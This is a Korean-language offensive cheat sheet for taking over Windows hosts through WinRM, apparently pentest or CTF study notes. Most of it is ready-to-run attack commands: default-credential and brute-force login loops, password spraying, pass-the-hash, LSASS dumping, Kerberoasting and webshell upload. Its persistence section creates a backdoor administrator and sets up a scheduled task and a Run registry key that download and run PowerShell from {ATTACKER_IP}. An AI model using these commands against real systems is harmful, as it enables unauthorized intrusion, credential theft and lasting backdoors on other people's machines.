# 💻 WINRM ATTACKS (Port 5985/5986)

> **목표: WinRM 서비스 발견 후 20-25분 내에 PowerShell 원격 쉘 획득**

## ⚡ 즉시 실행할 명령어들

### 🚀 WinRM 발견 즉시 실행

```bash
# 1. WinRM 포트 및 정보 확인
nmap -sV -p 5985,5986 {IP}
nmap --script http-title -p 5985 {IP}

# 2. evil-winrm으로 즉시 연결 시도
evil-winrm -i {IP} -u administrator -p password
evil-winrm -i {IP} -u admin -p admin
evil-winrm -i {IP} -u guest -p ""

# 3. impacket-wmiexec 시도 (WinRM 관련)
impacket-wmiexec administrator:password@{IP}
impacket-psexec administrator:password@{IP}

# 4. WinRM NSE 스크립트 실행 (백그라운드)
nmap --script winrm-* -p 5985 {IP} &

# 5. 다른 서비스에서 수집한 크레덴셜 즉시 시도
evil-winrm -i {IP} -u {DISCOVERED_USER} -p {DISCOVERED_PASS}
```

### ⚡ 도메인 환경 크레덴셜 즉시 시도

```bash
# 도메인 사용자로 접근
evil-winrm -i {IP} -u {DOMAIN}\\{USERNAME} -p {PASSWORD}
evil-winrm -i {IP} -u {USERNAME}@{DOMAIN} -p {PASSWORD}

# NTLM 해시 활용 (확보시)
evil-winrm -i {IP} -u {USERNAME} -H {NTLM_HASH}
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (5분)

- [ ] **WinRM 포트 확인** `nmap -p 5985,5986 {IP}`
- [ ] **HTTP/HTTPS WinRM 구분** (5985=HTTP, 5986=HTTPS)
- [ ] **WinRM 서비스 응답 확인**
- [ ] **운영체제 및 버전 확인**
- [ ] **도메인 환경 여부 확인**

### 🔐 Phase 2: 인증 시도 (10분)

- [ ] **기본 자격증명 시도** (administrator, admin)
- [ ] **다른 서비스에서 수집한 크레덴셜 시도**
- [ ] **도메인 환경 크레덴셜 시도**
- [ ] **Pass-the-Hash 시도** (해시 확보시)
- [ ] **브루트포스 공격 시작** (필요시)

### 💻 Phase 3: 쉘 획득 및 권한 확인 (7분)

- [ ] **PowerShell 원격 쉘 획득**
- [ ] **현재 사용자 및 권한 확인** `whoami /all`
- [ ] **시스템 정보 수집** `systeminfo`
- [ ] **네트워크 정보 확인** `ipconfig /all`
- [ ] **다른 사용자 및 그룹 확인**

### 🚀 Phase 4: 추가 공격 및 지속성 (3분)

- [ ] **권한 상승 가능성 확인**
- [ ] **파일 업로드/다운로드 테스트**
- [ ] **지속적 접근 방법 설정**
- [ ] **다른 시스템으로 이동 준비**

---

## 🎯 상황별 대응

### 🔓 기본 자격증명 성공시

```bash
# evil-winrm으로 PowerShell 쉘 획득
evil-winrm -i {IP} -u administrator -p password

# 연결 성공 후 즉시 실행할 명령들:
whoami
whoami /all
whoami /priv
hostname
systeminfo

# 네트워크 정보
ipconfig /all
netstat -an
arp -a

# 사용자 및 그룹 정보
net user
net localgroup administrators
net group /domain  # 도메인 환경인 경우

# 실행 중인 프로세스 및 서비스
tasklist
Get-Process
Get-Service
```

### 👥 도메인 환경 접근시

```bash
# 도메인 크레덴셜로 접근
evil-winrm -i {IP} -u {DOMAIN}\\{USERNAME} -p {PASSWORD}
evil-winrm -i {IP} -u {USERNAME}@{DOMAIN} -p {PASSWORD}

# 도메인 정보 수집 (PowerShell 세션 내)
$env:USERDOMAIN
$env:LOGONSERVER
nltest /dclist:{DOMAIN}

# Active Directory 정보 수집
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net user /domain

# 도메인 컨트롤러 확인
nslookup -type=SRV _ldap._tcp.{DOMAIN}

# 도메인 신뢰 관계 확인
nltest /domain_trusts
```

### 🔐 Pass-the-Hash 공격 (해시 확보시)

```bash
# NTLM 해시로 WinRM 접근
evil-winrm -i {IP} -u {USERNAME} -H {NTLM_HASH}

# impacket 도구들로 해시 활용
impacket-wmiexec -hashes {LM_HASH}:{NTLM_HASH} {USERNAME}@{IP}
impacket-psexec -hashes {LM_HASH}:{NTLM_HASH} {USERNAME}@{IP}

# crackmapexec로 해시 검증
crackmapexec winrm {IP} -u {USERNAME} -H {NTLM_HASH}
```

### 🔄 브루트포스 공격

```bash
# crackmapexec를 이용한 WinRM 브루트포스
crackmapexec winrm {IP} -u administrator -p passwords.txt
crackmapexec winrm {IP} -u users.txt -p passwords.txt

# 특정 사용자에 대한 패스워드 스프레이
crackmapexec winrm {IP} -u administrator -p password -p admin -p Password123

# 도메인 사용자 브루트포스
crackmapexec winrm {IP} -u {DOMAIN}\\administrator -p passwords.txt

# Hydra를 이용한 WinRM 브루트포스 (HTTP 기반)
hydra -l administrator -P passwords.txt {IP} http-post-form "/wsman:username=^USER^&password=^PASS^:401 Unauthorized"

# Metasploit 브루트포스
msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS {IP}
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### 💻 PowerShell 원격 세션 활용

```bash
# 파일 업로드 (evil-winrm 세션 내)
upload /path/to/local/file.exe C:\temp\file.exe

# 파일 다운로드
download C:\temp\important.txt /path/to/save/

# PowerShell 스크립트 실행
menu  # evil-winrm 메뉴
Invoke-Binary /path/to/binary.exe

# 서비스 관련 명령
services  # 서비스 목록

# 메모리 덤프
lsadump  # LSASS 덤프 시도

# PowerShell 히스토리 확인
Get-History
(Get-PSReadlineOption).HistorySavePath
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### 🛠️ 시스템 정보 수집 및 권한 상승 준비

```bash
# 시스템 상세 정보
Get-ComputerInfo
Get-HotFix  # 설치된 패치 확인

# 권한 상승 벡터 확인
whoami /priv
Get-Service | Where-Object {$_.Status -eq "Running"}

# 스케줄된 작업 확인
schtasks /query /fo LIST /v
Get-ScheduledTask

# 자동 실행 프로그램 확인
Get-WmiObject Win32_StartupCommand
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 네트워크 연결 및 포트 확인
netstat -ano
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# 설치된 소프트웨어 확인
Get-WmiObject -Class Win32_Product
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
```

---

## 🚨 문제 해결

### 🚫 WinRM 연결 거부시

```bash
# HTTPS WinRM 확인 (5986)
evil-winrm -i {IP} -u administrator -p password -S -P 5986

# 다른 WinRM 포트 확인
nmap -p 5985,5986,47001 {IP}

# WinRM 서비스 상태 확인
nmap --script http-title -p 5985 {IP}

# 방화벽 우회 시도
nmap -sS -p 5985 {IP}
nmap -sA -p 5985 {IP}
```

### 🔒 인증 실패시

```bash
# 다양한 사용자명 시도
users=("administrator" "admin" "guest" "user" "winrm" "service")
passwords=("password" "admin" "Password123" "" "123456")

for user in "${users[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "Trying $user:$pass"
        timeout 10 evil-winrm -i {IP} -u $user -p "$pass" -e "whoami" 2>/dev/null && echo "SUCCESS: $user:$pass"
    done
done

# 도메인 사용자 시도 (도메인 정보가 있는 경우)
evil-winrm -i {IP} -u {DOMAIN}\\administrator -p password
evil-winrm -i {IP} -u administrator@{DOMAIN} -p password
```

### 🌐 SSL/TLS 문제 (HTTPS WinRM)

```bash
# SSL 인증서 무시
evil-winrm -i {IP} -u administrator -p password -S -k

# 특정 SSL 포트
evil-winrm -i {IP} -u administrator -p password -S -P 5986

# SSL 정보 확인
nmap --script ssl-cert -p 5986 {IP}
openssl s_client -connect {IP}:5986
```

### 🔧 PowerShell 실행 정책 문제

```bash
# PowerShell 실행 정책 확인 (WinRM 세션 내)
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# 실행 정책 우회
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -ExecutionPolicy Unrestricted -Command "command_here"

# Base64 인코딩 명령 실행
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

### 📱 evil-winrm 연결 문제

```bash
# 다른 WinRM 클라이언트 시도
# Ruby WinRM 라이브러리 직접 사용
require 'winrm'
conn = WinRM::Connection.new(
  endpoint: 'http://{IP}:5985/wsman',
  user: 'administrator',
  password: 'password'
)
conn.shell(:powershell) do |shell|
  output = shell.run('whoami')
  puts output.output
end

# Python pywinrm 사용
python3 -c "
import winrm
session = winrm.Session('{IP}', auth=('administrator', 'password'))
result = session.run_ps('whoami')
print(result.std_out)
"
```

---

## 🔗 다른 서비스와 연계

### 🗂️ SMB/RPC와 연계

```bash
# SMB에서 수집한 사용자로 WinRM 접근
enum4linux {IP} | grep "user:" | cut -d[ -f2 | cut -d] -f1 > winrm_users.txt
crackmapexec winrm {IP} -u winrm_users.txt -p passwords.txt

# RPC에서 수집한 정보 활용
rpcclient -U "" -N {IP}
# enumdomusers 결과를 WinRM 브루트포스에 활용
```

### 🏢 Active Directory와 연계

```bash
# LDAP에서 수집한 도메인 사용자로 WinRM 접근
ldapsearch -x -h {IP} -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 > domain_users.txt

# 도메인 사용자로 WinRM 브루트포스
while read user; do
    evil-winrm -i {IP} -u {DOMAIN}\\$user -p password -e "whoami" 2>/dev/null
done < domain_users.txt
```

### 🌐 웹 애플리케이션과 연계

```bash
# 웹 애플리케이션에서 발견한 크레덴셜로 WinRM 시도
# config 파일에서 발견한 Windows 계정 정보 활용
evil-winrm -i {IP} -u {WEB_DISCOVERED_USER} -p {WEB_DISCOVERED_PASS}

# WinRM을 통해 웹쉘 업로드
upload webshell.aspx C:\inetpub\wwwroot\shell.aspx
```

### 🗄️ 데이터베이스와 연계

```bash
# MSSQL에서 수집한 Windows 인증 정보로 WinRM 접근
# xp_cmdshell에서 수집한 정보 활용
evil-winrm -i {IP} -u {MSSQL_SERVICE_USER} -p {PASSWORD}
```

---

## 🛠️ 고급 WinRM 공격 기법

### 🎭 Kerberoasting (도메인 환경)

```bash
# WinRM 접근 후 Kerberos 공격
# PowerShell 세션 내에서:
Add-Type -AssemblyName System.IdentityModel
setspn -T {DOMAIN} -Q */*

# Rubeus 사용 (업로드 후)
upload Rubeus.exe C:\temp\Rubeus.exe
C:\temp\Rubeus.exe kerberoast /outfile:C:\temp\hashes.txt

# impacket GetUserSPNs (로컬에서)
impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP}
```

### 🔍 WinRM 로그 분석 (접근 후)

```bash
# WinRM 관련 이벤트 로그 확인
Get-WinEvent -LogName "Microsoft-Windows-WinRM/Operational" | Select-Object -First 20

# PowerShell 로그 확인
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}

# 보안 로그에서 로그온 이벤트 확인
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select-Object -First 10
```

### 📊 WinRM 정보 수집 자동화

```bash
#!/bin/bash
IP=$1

echo "=== WinRM Information Gathering for $IP ==="

# 기본 정보 수집
echo "[+] WinRM Service Information:"
nmap -sV -p 5985,5986 $IP

# WinRM 응답 확인
echo "[+] WinRM Response Check:"
curl -s http://$IP:5985/wsman 2>/dev/null && echo "HTTP WinRM Accessible"
curl -s -k https://$IP:5986/wsman 2>/dev/null && echo "HTTPS WinRM Accessible"

# 기본 자격증명 테스트
echo "[+] Testing Default Credentials:"
credentials=("administrator:password" "admin:admin" "administrator:" "guest:")
for cred in "${credentials[@]}"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    echo "Testing $user:$pass"
    timeout 15 evil-winrm -i $IP -u $user -p "$pass" -e "whoami" 2>/dev/null && echo "SUCCESS: $user:$pass"
done

echo "=== WinRM Scan Complete ==="
```

### 💾 지속성 및 백도어 (접근 성공 후)

```bash
# 새 로컬 사용자 생성
net user backdoor Password123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Management Users" backdoor /add

# WinRM 서비스 활성화 (비활성화된 경우)
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Service\AllowUnencrypted $true

# 스케줄된 작업으로 지속성
schtasks /create /tn "System Update" /tr "powershell.exe -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}/persistence.ps1')\"" /sc daily /st 12:00

# 레지스트리 Run 키
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}/backdoor.ps1')\""
```

---

## ⏱️ 시간 관리 가이드

### 🎯 5분 안에 완료할 것들

- [ ] WinRM 포트 및 서비스 확인
- [ ] 기본 자격증명 시도 (administrator, admin)
- [ ] 다른 서비스에서 수집한 크레덴셜 시도
- [ ] HTTP/HTTPS WinRM 구분 확인

### 🔍 15분 안에 완료할 것들

- [ ] 모든 가능한 사용자 계정으로 인증 시도
- [ ] 도메인 환경 크레덴셜 시도
- [ ] Pass-the-Hash 공격 시도 (해시 확보시)
- [ ] 브루트포스 공격 시작

### 💥 25분 후 판단 기준

**성공 기준:**

- [ ] WinRM PowerShell 원격 쉘 획득
- [ ] 시스템 정보 수집 및 권한 확인 완료
- [ ] 파일 업로드/다운로드 기능 확인
- [ ] 지속적 접근 방법 설정 또는 권한 상승 준비

**성공시 계속 진행:**

- [ ] 권한 상승 시도
- [ ] 도메인 환경 탐색 (AD 공격)
- [ ] 크레덴셜 덤프 및 다른 시스템 공격

**실패시 다음 단계:**

- [ ] 브루트포스를 백그라운드로 계속 실행
- [ ] 다른 Windows 서비스 확인 (RDP, SMB)
- [ ] 웹 애플리케이션에서 Windows 크레덴셜 재확인
- [ ] 다른 포트/서비스로 우선순위 이동

**다음 단계**:

- WinRM 접근 성공시 `PRIVILEGE-ESCALATION/windows-privesc/checklist.md`로
- PowerShell 환경 활용으로 효율적인 정보 수집 및 공격
- 도메인 환경시 AD 공격 준비
- 실패시 다른 `PORT-ATTACKS/` 파일로 이동
